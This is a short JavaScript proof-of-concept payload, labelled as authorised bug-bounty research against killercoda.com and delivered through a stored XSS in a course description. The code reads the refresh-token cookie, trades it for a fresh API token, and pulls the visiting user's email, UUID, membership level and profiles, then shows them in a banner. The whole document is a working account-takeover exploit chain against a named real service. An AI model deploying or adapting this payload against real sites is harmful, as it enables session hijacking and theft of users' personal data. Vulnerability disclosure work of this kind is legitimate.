// Killercoda bug-bounty PoC payload (authorised security research).
// Loaded by the stored-XSS in a course description. Runs entirely in the
// visitor's own browser. NOTHING is sent to any third party.
(async () => {
  const out = { origin: location.origin, page: location.href.split('#')[0] };
  const rt = (document.cookie.match(/jwt_refresh_token=([^;]+)/) || [])[1];
  out.refreshTokenReadableFromJS = !!rt;
  out.refreshTokenLength = rt ? rt.length : 0;
  if (rt) {
    const r = await fetch('https://api.killercoda.com/auth/token/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/ld+json' },
      body: JSON.stringify({ refresh_token: rt })
    });
    const j = await r.json();
    if (j.token) {
      out.mintedFreshApiJwt = true;
      const u = await (await fetch('https://api.killercoda.com/users', {
        headers: { Authorization: 'Bearer ' + j.token, Accept: 'application/ld+json' }
      })).json();
      const m = u['hydra:member'][0];
      out.victimEmail = m.email;
      out.victimUuid = m.uuid;
      out.victimMembership = m.membership.level;
      out.victimProfiles = m.profiles.map(p => p.name);
    }
  }
  window.__KC_XSS = out;
  const b = document.createElement('div');
  b.id = 'kcxss';
  b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#b00020;color:#fff;font:13px/1.5 ui-monospace,monospace;padding:12px;white-space:pre-wrap';
  b.textContent = 'STORED XSS -> ACCOUNT TAKEOVER (authorised PoC, killercoda.com bug bounty)\n' + JSON.stringify(out, null, 1);
  document.body.appendChild(b);
})();
